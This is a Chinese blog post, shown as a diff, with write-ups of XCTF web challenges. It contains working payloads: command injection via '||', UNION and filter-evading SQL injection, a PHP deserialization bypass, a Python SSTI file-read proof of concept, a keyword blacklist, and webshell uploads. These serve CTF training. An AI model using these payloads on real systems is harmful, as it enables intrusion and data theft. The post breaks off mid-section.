@@ -1,0 +1,832 @@
+
+ <!DOCTYPE HTML>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  
+    <title>攻防世界xctf之web | Hexo</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
+    
+    <meta name="author" content="John Doe">
+    
+
+    
+    <meta name="description" content="前言过来看看。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="攻防世界xctf之web">
+<meta property="og:url" content="http://example.com/2019/04/18/%E5%A4%A7%E5%AD%A6CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cxctf%E4%B9%8Bweb/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="前言过来看看。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/19/E9PZ1P.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/19/E9in81.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/19/E9iIZF.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/19/E9FAQP.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/19/E9F4SI.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/19/E9Fxlq.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/19/E9ULsP.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/19/E9atFe.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/19/E9asw8.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/19/E9ahyq.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/19/E9aowT.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/05/17/ELE6SA.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/05/17/ELJxAJ.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/05/17/ELJzN9.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/05/17/ELYZAH.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/05/17/ELYEHe.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/05/23/VCUwin.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/05/23/VCUgZ4.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/05/23/VCUqdH.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/05/23/VCdJEQ.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/05/23/VPp3sH.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/05/23/VPpBQg.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/05/23/VPPPRf.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/05/23/VPPtoR.png">
+<meta property="article:published_time" content="2019-04-18T13:06:57.000Z">
+<meta property="article:modified_time" content="2020-12-11T14:40:23.563Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="攻防世界xctf-web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.ax1x.com/2019/04/19/E9PZ1P.png">
+
+    
+    <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/tou1.png">
+    
+    
+    <link rel="apple-touch-icon" href="/img/jacman.jpg">
+    <link rel="apple-touch-icon-precomposed" href="/img/jacman.jpg">
+    
+    
+<link rel="stylesheet" href="/css/style.css">
+<link rel="stylesheet" href="/%02.css">
+<link rel="stylesheet" href="/.css">
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+  <body>
+    <header>
+      
+<div>
+		
+			<div id="imglogo">
+				<a href="/"><img src="/img/logo.jpg" alt="Hexo" title="Hexo"/></a>
+			</div>
+			
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="Hexo">Hexo</a></h1>
+				<h2 class="blog-motto"></h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="Menu">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					<ul>
+					 
+						<li><a href="/">Home</a></li>
+					
+						<li><a href="/archives">Archives</a></li>
+					
+						<li><a href="/about">About</a></li>
+					
+						<li><a href="/tags">Tags</a></li>
+					
+						<li><a href="/categories">Categories</a></li>
+					
+					<li>
+ 					
+					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="search" id="search" name="q" autocomplete="off" maxlength="20" placeholder="Search" />
+						<input type="hidden" name="q" value="site:example.com">
+					</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
+    </header>
+    <div id="container">
+      <div id="main" class="post" itemscope itemprop="blogPost">
+  
+	<article itemprop="articleBody"> 
+		<header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2019/04/18/大学CTF/攻防世界xctf之web/" title="攻防世界xctf之web" itemprop="url">攻防世界xctf之web</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="John Doe" target="_blank" itemprop="author">John Doe</a>
+		
+  <p class="article-time">
+    <time datetime="2019-04-18T13:06:57.000Z" itemprop="datePublished"> Published 2019-04-18</time>
+    
+  </p>
+</header>
+	<div class="article-content">
+		
+		<div id="toc" class="toc-article">
+			<strong class="toc-title">Contents</strong>
+		
+			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A3%E6%96%87"><span class="toc-number">2.</span> <span class="toc-text">正文</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0"><span class="toc-number">2.1.</span> <span class="toc-text">新手练习</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#view-source"><span class="toc-number">2.1.1.</span> <span class="toc-text">view_source</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#get-post"><span class="toc-number">2.1.2.</span> <span class="toc-text">get_post</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#robots"><span class="toc-number">2.1.3.</span> <span class="toc-text">robots</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#backup"><span class="toc-number">2.1.4.</span> <span class="toc-text">backup</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cookie"><span class="toc-number">2.1.5.</span> <span class="toc-text">cookie</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#disable-button"><span class="toc-number">2.1.6.</span> <span class="toc-text">disable_button</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#simple-js"><span class="toc-number">2.1.7.</span> <span class="toc-text">simple_js</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#xff-referer"><span class="toc-number">2.1.8.</span> <span class="toc-text">xff_referer</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#weak-auth"><span class="toc-number">2.1.9.</span> <span class="toc-text">weak_auth</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#webshell"><span class="toc-number">2.1.10.</span> <span class="toc-text">webshell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#command-execution"><span class="toc-number">2.1.11.</span> <span class="toc-text">command_execution</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#simple-php"><span class="toc-number">2.1.12.</span> <span class="toc-text">simple_php</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6"><span class="toc-number">2.2.</span> <span class="toc-text">高手进阶</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Training-WWW-Robots"><span class="toc-number">2.2.1.</span> <span class="toc-text">Training-WWW-Robots</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#unserialize3"><span class="toc-number">2.2.2.</span> <span class="toc-text">unserialize3</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#hacker-news"><span class="toc-number">2.2.3.</span> <span class="toc-text">hacker news</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#upload"><span class="toc-number">2.2.4.</span> <span class="toc-text">upload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Confusion1"><span class="toc-number">2.2.5.</span> <span class="toc-text">Confusion1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ics-06"><span class="toc-number">2.2.6.</span> <span class="toc-text">ics-06</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#upload-1"><span class="toc-number">2.2.7.</span> <span class="toc-text">upload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#mfw"><span class="toc-number">2.2.8.</span> <span class="toc-text">mfw</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Lottery"><span class="toc-number">2.2.9.</span> <span class="toc-text">Lottery</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#FlatScience"><span class="toc-number">2.2.10.</span> <span class="toc-text">FlatScience</span></a></li></ol></li></ol></li></ol>
+		
+		</div>
+		
+		<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>过来看看。<span id="more"></span></p>
+<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="新手练习"><a href="#新手练习" class="headerlink" title="新手练习"></a>新手练习</h3><h4 id="view-source"><a href="#view-source" class="headerlink" title="view_source"></a>view_source</h4><p>就是看源码啦。</p>
+<h4 id="get-post"><a href="#get-post" class="headerlink" title="get_post"></a>get_post</h4><p>get：`?a=1’</p>
+<p>post:  `b=21</p>
+<h4 id="robots"><a href="#robots" class="headerlink" title="robots"></a>robots</h4><p>robots.txt是一个协议，而不是一个命令。robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。robots.txt文件告诉蜘蛛程序在服务器上什么文件是可以被查看的</p>
+<p>打开robots.txt，有一个flag***.php，打开就行。</p>
+<h4 id="backup"><a href="#backup" class="headerlink" title="backup"></a>backup</h4><p>做了之后忘记题是什么了，反正很简单。</p>
+<h4 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h4><p>F12查看网络参数，发现cookie：cookie.php，访问cookie.php，再次查看header，发现flag。</p>
+<h4 id="disable-button"><a href="#disable-button" class="headerlink" title="disable_button"></a>disable_button</h4><p>有一个按钮，点击之后没有反应，查看源码，发现按钮要实现的功能是post提交一个值auth(好像是这个名字，忘了)，使<code>auth=flag</code>，post提交就可以了。</p>
+<h4 id="simple-js"><a href="#simple-js" class="headerlink" title="simple_js"></a>simple_js</h4><p>一个前端验证，不管输入什么密码，都无法验证成功，看了源码，发现自己看不懂，只能看懂大概，正确的密码应该就是那段十六进制字符串，转成字符之后，变成了数字，应该是ascii码，再转字符，得到一个字符串，我以为这是密码，还需要提交才能得到flag，试了几次都不行，然后直接当做flag提交，就对了。</p>
+<h4 id="xff-referer"><a href="#xff-referer" class="headerlink" title="xff_referer"></a>xff_referer</h4><p>要求IP地址是123.123.123.123，直接bp抓包，在header中添加伪造<code>X-Forwarded-For:123.123.123.123</code>,</p>
+<p>go之后，要求<code>document.getElementById(&quot;demo&quot;).innerHTML=&quot;必须来自https://www.google.com&quot;;</code></p>
+<p>再在header中添加，<code>referer:https://www.google.com</code>,即可得到flag。</p>
+<h4 id="weak-auth"><a href="#weak-auth" class="headerlink" title="weak_auth"></a>weak_auth</h4><p>随便输入一个用户名和密码，提示必须使用admin登录，用户名改成admin之后，报错是密码错误，然后出现一个check.php，查看源码之后，提示<strong>你需要一个字典</strong>，</p>
+<p>直接bp抓包，然后，load一个密码字典爆破，即可。</p>
+<h4 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h4><p>直接菜刀连接一下getshell。</p>
+<h4 id="command-execution"><a href="#command-execution" class="headerlink" title="command_execution"></a>command_execution</h4><p>命令执行，</p>
+<p><code>ping 1.1.1.1</code></p>
+<p><img src="https://s2.ax1x.com/2019/04/19/E9PZ1P.png" alt="E9PZ1P.png"></p>
+<p><code>ping 1.1.1.1&amp;&amp;ls</code>，ls没有执行，&amp;&amp;应该是被过滤了，这里的ping -c 3:</p>
+<blockquote>
+<p>判断操作系统类型，若是windows类型，执行ping ip命令；若是非windows类型，执行ping -c 3 ip 命令</p>
+</blockquote>
+<p><img src="https://s2.ax1x.com/2019/04/19/E9in81.png" alt="E9in81.png"></p>
+<p><code>ping 1.1.1.1||ls</code>，ls被执行了，||没有被过滤，</p>
+<p><img src="https://s2.ax1x.com/2019/04/19/E9iIZF.png" alt="E9iIZF.png"></p>
+<p><code>ping 1.1.1.1||ls /</code>，可以看到整个目录，</p>
+<p><img src="https://s2.ax1x.com/2019/04/19/E9FAQP.png" alt="E9FAQP.png"></p>
+<p>最后在home文件夹找到flag.txt</p>
+<p><code>ping 1.1.1.1||cat /home/flag.txt</code></p>
+<p><img src="https://s2.ax1x.com/2019/04/19/E9F4SI.png" alt="E9F4SI.png"></p>
+<h4 id="simple-php"><a href="#simple-php" class="headerlink" title="simple_php"></a>simple_php</h4><p><img src="https://s2.ax1x.com/2019/04/19/E9Fxlq.png" alt="E9Fxlq.png"></p>
+<p>直接给出了源码，get提交a和b，要求a=0，并且a不为空，php解析是碰到0e开头串时，会把它当做0，</p>
+<p>要求b不是数字，如果b是数字，则exit()，而且要求b&gt;1234，PHP在解析时，遇到类似<strong>11xxx</strong>的串，只会解析前面的数字，也就是说11xxx=11，</p>
+<p>所以payload：a=0e&amp;b=1333x</p>
+<h3 id="高手进阶"><a href="#高手进阶" class="headerlink" title="高手进阶"></a>高手进阶</h3><h4 id="Training-WWW-Robots"><a href="#Training-WWW-Robots" class="headerlink" title="Training-WWW-Robots"></a>Training-WWW-Robots</h4><p>又是robots，查看robots.txt之后，发现有一个fl0g.php，打开得到flag</p>
+<h4 id="unserialize3"><a href="#unserialize3" class="headerlink" title="unserialize3"></a>unserialize3</h4><p>源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$flag</span> = <span class="string">&#x27;111&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">&#x27;bad requests&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">?code=</span><br></pre></td></tr></table></figure>
+
+<p>get提交code，code的值是serialize()序列化后的串，</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$flag</span>=<span class="string">&#x27;111&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> xctf();</span><br><span class="line">print_r(serialize(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>
+
+<p>结果是：<code>O:4:&quot;xctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</code></p>
+<p>提交之后，后台会进行会序列化，此时就会自动执行__wakeup()函数，然后输出bad request</p>
+<p>所以，我们要绕过这个__wakeup()函数，<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_39850969/article/details/86537898">参考文章</a></p>
+<p>在这个序列化后的串中：O:4:”xctf”:1:{s:4:”flag”;s:3:”111”;}</p>
+<p>里面有个数字 1 ，这个 1 代表的是对象的属性个数，这里只有$flag这一个属性。</p>
+<p>而__wakeup()函数漏洞就是与对象的属性个数有关，如果序列化后的字符串中表示属性个数的数字与真实属性个数一致，那么就调用__wakeup()函数，如果该数字大于真实属性个数，就会绕过__wakeup()函数。 </p>
+<p>__construct()</p>
+<p>__实例化对象时被调用。__construct()是构造函数，同时当函数名和类名相同的时候，也是构造函数，构造函数有两种表达方式。</p>
+<p>但是当__construct和以类名为函数名的函数同时存在的时候，__construct将被调用，而以类名作为函数名的构造函数不被调用。</p>
+<p>所以，payload: `?code=O:4:”xctf”:2:{s:4:”flag”;s:3:”111”;}</p>
+<h4 id="hacker-news"><a href="#hacker-news" class="headerlink" title="hacker news"></a>hacker news</h4><p><img src="https://s2.ax1x.com/2019/04/19/E9ULsP.png" alt="E9ULsP.png"></p>
+<p>猜测是一道注入题，输入1正常回显，输入<code>1&#39;</code>不能正常回显，应该是单引号闭合，</p>
+<p>经测试，有3列</p>
+<p>爆库，payload：<code>-1&#39; union select 1,2,database()#</code></p>
+<p><img src="https://s2.ax1x.com/2019/04/19/E9atFe.png" alt="E9atFe.png"></p>
+<p>爆表，<code>-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;news&#39;#</code></p>
+<p><img src="https://s2.ax1x.com/2019/04/19/E9asw8.png" alt="E9asw8.png"></p>
+<p>爆列，<code>-1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;secret_table&#39;#</code></p>
+<p><img src="https://s2.ax1x.com/2019/04/19/E9ahyq.png" alt="E9ahyq.png"></p>
+<p>爆内容，<code>-1&#39; union select 1,2,fl4g from secret_table#</code></p>
+<p><img src="https://s2.ax1x.com/2019/04/19/E9aowT.png" alt="E9aowT.png"></p>
+<h4 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h4><p>先注册一个账户，然后点击login，输入账号密码登录，然后就有上传界面了。</p>
+<p>图片的文件名可以造成注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">selselectect` `frfromom</span><br></pre></td></tr></table></figure>
+
+<p>可以绕过对<code>select,from</code>的过滤</p>
+<p>构造payload</p>
+<p>查询数据库:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sql &#x27;+(selselectect CONV(substr(hex(dAtaBase()),1,12),16,10))+&#x27;.jpg</span><br></pre></td></tr></table></figure>
+
+<p>返回:</p>
+<blockquote>
+<p>sql 131277325825392 =&gt; web_up</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sql &#x27;+(selselectect CONV(substr(hex(dAtaBase()),13,12),16,10))+&#x27;.jpg</span><br></pre></td></tr></table></figure>
+
+<p>返回:</p>
+<blockquote>
+<p>sql 1819238756 =&gt; load</p>
+</blockquote>
+<p>拼接起来得知数据库名为:<code>web_upload</code></p>
+<p>然后查表:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sql &#x27;+(seleselectct+CONV(substr(hex((selselectect TABLE_NAME frfromom  information_schema.TABLES where TABLE_SCHEMA = &#x27;web_upload&#x27; limit  1,1)),1,12),16,10))+&#x27;.jpg</span><br></pre></td></tr></table></figure>
+
+<p>返回:</p>
+<blockquote>
+<p>sql 114784820031327 =&gt; hello_</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sql &#x27;+(seleselectct+CONV(substr(hex((selselectect TABLE_NAME frfromom  information_schema.TABLES where TABLE_SCHEMA = &#x27;web_upload&#x27; limit  1,1)),13,12),16,10))+&#x27;.jpg</span><br></pre></td></tr></table></figure>
+
+<p>返回:</p>
+<blockquote>
+<p>sql 112615676665705 =&gt; flag_i</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sql &#x27;+(seleselectct+CONV(substr(hex((selselectect TABLE_NAME frfromom  information_schema.TABLES where TABLE_SCHEMA = &#x27;web_upload&#x27; limit  1,1)),25,12),16,10))+&#x27;.jpg</span><br></pre></td></tr></table></figure>
+
+<p>返回:</p>
+<blockquote>
+<p>sql 126853610566245 =&gt; s_here</p>
+</blockquote>
+<p>拼接起来得知存放flag的表名为: <code>hello_flag_is_here</code></p>
+<p>然后查这个表里有什么字段:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sql &#x27;+(seleselectct+CONV(substr(hex((seselectlect COLUMN_NAME frfromom  information_schema.COLUMNS where TABLE_NAME = &#x27;hello_flag_is_here&#x27; limit  0,1)),1,12),16,10))+&#x27;.jpg</span><br></pre></td></tr></table></figure>
+
+<p>返回:</p>
+<blockquote>
+<p>sql 115858377367398 =&gt; i_am_f</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sql &#x27;+(seleselectct+CONV(substr(hex((seselectlect COLUMN_NAME frfromom  information_schema.COLUMNS where TABLE_NAME = &#x27;hello_flag_is_here&#x27; limit  0,1)),13,12),16,10))+&#x27;.jpg</span><br></pre></td></tr></table></figure>
+
+<p>返回:</p>
+<blockquote>
+<p>sql 7102823=&gt; lag</p>
+</blockquote>
+<p>拼接起来得知存放flag的字段是:<code>i_am_flag</code></p>
+<p>然后查询flag:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sql &#x27;+(seleselectct+CONV(substr(hex((selselectect i_am_flag frfromom hello_flag_is_here limit 0,1)),1,12),16,10))+&#x27;.jpg</span><br></pre></td></tr></table></figure>
+
+<p>返回:</p>
+<blockquote>
+<p>sql 36427215695199 =&gt; !!<em>@m</em></p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sql &#x27;+(seleselectct+CONV(substr(hex((selselectect i_am_flag frfromom hello_flag_is_here limit 0,1)),13,12),16,10))+&#x27;.jpg</span><br></pre></td></tr></table></figure>
+
+<p>返回:</p>
+<blockquote>
+<p>sql 92806431727430=&gt; Th.e_F</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sql &#x27;+(seleselectct+CONV(substr(hex((selselectect i_am_flag frfromom hello_flag_is_here limit 0,1)),25,12),16,10))+&#x27;.jpg</span><br></pre></td></tr></table></figure>
+
+<p>返回:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sql 560750951=&gt; !lag</span><br></pre></td></tr></table></figure>
+
+<p>拼起来之后得到flag: <code>!!_@m_Th.e_F!lag</code></p>
+<h4 id="Confusion1"><a href="#Confusion1" class="headerlink" title="Confusion1"></a>Confusion1</h4><ul>
+<li>首先浏览网站，在导航栏上只有index.php login.php register.php三个页面，打开导航栏上的login.php和register.php，发现是404页面</li>
+<li>这个404页面乍一看和普通页面没什么不同，但是查看源码可以发现提示了flag的路径，所以题目意思就是要去读文件</li>
+<li>但是login和register功能都没有实现，也就是说没有任何接受用户输入的地方</li>
+<li>在index.php页面中有一张图片，图片的内容是一条大蟒蛇缠住了一只大象，很明显这只大象就是PHP的那只吉祥物，大蟒蛇也意味着Python了，所以这到题目应该和Python有关，但是还是不知道哪里可以接受到用户的输入</li>
+<li>仔细翻阅网站，可以发现只有两处可被用户控制的地方，就是404页面和403页面中输出url的地方</li>
+<li>首先试试这里有没有XSS，在404页面当我们输入XSS的payload时会弹出一个Nope，说明对某些字符进行了过滤，所以很问题明显就出在404页面</li>
+<li>既然发现了404页面有问题，但是如果实在想不到SSTI的话那也没办法往下做了</li>
+<li>测试5*5，发现404页面输出url的地方却输出了25，于是照着SSTI的思路往下做</li>
+<li>后端其实用了Python来模拟PHP</li>
+<li>我在黑名单中禁用了一些字符串，就不一一测试了，这里直接给出部分关键黑名单</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`     black_list = [     &#x27;write&#x27;, &#x27;class&#x27;, &#x27;mro&#x27;, &#x27;read&#x27;, &#x27;&lt;&#x27;, &#x27;&gt;&#x27;, &#x27;|&#x27;, &#x27;join&#x27;     &#x27;os&#x27;, &#x27;sys&#x27;, &#x27;pop&#x27;, &#x27;del&#x27;, &#x27;rm&#x27;, &#x27;eval&#x27;, &#x27;exec&#x27;, &#x27;ls&#x27;, &#x27;cat&#x27;,     &#x27;;&#x27;, &#x27;&amp;&amp;&#x27;, &#x27;catch_warnings&#x27;, &#x27;func_globals&#x27;, &#x27;pickle&#x27;, &#x27;import&#x27;, &#x27;subprocess&#x27;, &#x27;commands&#x27;, &#x27;input&#x27;, &#x27;execfile&#x27;,      &#x27;reload&#x27;, &#x27;compile&#x27;, &#x27;execfile&#x27;, &#x27;kill&#x27;, &#x27;func_code&#x27; ]</span><br></pre></td></tr></table></figure>
+
+<p>关键字过滤可以使用request.args绕过</p>
+<ul>
+<li>POC:  <code>http://xx.xx.xx.xx:xxxx/[request.args.a][request.args.b][2][request.args.c]()[40](&#39;/opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt&#39;)[request.args.d]()?a=__class__&amp;b=__mro__&amp;c=__subclasses__&amp;d=read</code></li>
+</ul>
+<h4 id="ics-06"><a href="#ics-06" class="headerlink" title="ics-06"></a>ics-06</h4><p>一脸懵逼。。。</p>
+<p>一顿乱点，终于在报表中心发现了问题</p>
+<p><img src="https://s2.ax1x.com/2019/05/17/ELE6SA.png" alt="ELE6SA.png"></p>
+<p>然后，试了几个数字，发现不管输入id等于几都返回一样的界面，问题在哪呢？</p>
+<p>尝试访问一下所有界面，写个脚本爆破一下，发现id=2333时弹出flag</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://111.198.29.45:39994/index.php?id=&#123;num&#125;&quot;</span></span><br><span class="line">ses=requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">2000</span>,<span class="number">3000</span>,<span class="number">1</span>):</span><br><span class="line">	payload=url.format(num=i)</span><br><span class="line">	res=ses.get(payload)</span><br><span class="line">	<span class="keyword">print</span>(payload)</span><br><span class="line">	<span class="keyword">print</span>(i)</span><br><span class="line">	<span class="keyword">if</span> <span class="string">&#x27;cyberpeace&#x27;</span> in res.content:</span><br><span class="line">		<span class="keyword">print</span>(res.content)</span><br><span class="line">		<span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p>这个flag的关键字想不到啊。。。</p>
+<h4 id="upload-1"><a href="#upload-1" class="headerlink" title="upload"></a>upload</h4><p><img src="https://s2.ax1x.com/2019/05/17/ELJxAJ.png" alt="ELJxAJ.png"></p>
+<p>上传jpg，成功上传，返回了文件的路径</p>
+<p><img src="https://s2.ax1x.com/2019/05/17/ELJzN9.png" alt="ELJzN9.png"></p>
+<p>但是文件名变成了1558088360.eee.jpg，bp抓包操作一波</p>
+<p>把文件名改成ee.php，成功上传，但是文件名是15556235.eee.php，看来是不管你上传什么，他都在你文件名的前面加一部分，所以，只需要把文件名改成<strong>php</strong>就可以了</p>
+<p><img src="https://s2.ax1x.com/2019/05/17/ELYZAH.png" alt="ELYZAH.png"></p>
+<p>上传成功，是php文件，而且有路径，接下来菜刀连接，找到flag.php，即可得到flag</p>
+<p><img src="https://s2.ax1x.com/2019/05/17/ELYEHe.png" alt="ELYEHe.png"></p>
+<p>PHP2</p>
+<p>上来只有一句话，<code>Can you anthenticate to this website?</code>，尝试了改IP不行之后，扫描一下网站后台，发现index.phps，访问之后，拿到源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&quot;admin&quot;</span>===<span class="variable">$_GET</span>[id]) &#123;</span><br><span class="line">  <span class="keyword">echo</span>(<span class="string">&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_GET</span>[id] = urldecode(<span class="variable">$_GET</span>[id]);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[id] == <span class="string">&quot;admin&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Key: xxxxxxx &lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>id===admin时，输出not allowed</p>
